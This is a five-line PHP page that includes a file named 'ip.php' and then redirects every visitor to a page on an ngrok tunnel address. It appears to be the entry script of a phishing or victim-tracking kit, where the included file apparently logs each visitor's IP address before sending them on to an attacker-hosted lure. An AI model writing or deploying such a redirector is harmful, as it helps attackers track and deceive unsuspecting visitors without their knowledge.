<?php
include 'ip.php';
header('Location: https://ece4-2402-8100-2104-97ba-d0db-17dc-3d5f-b367.ngrok.io/index2.html');
exit
?>
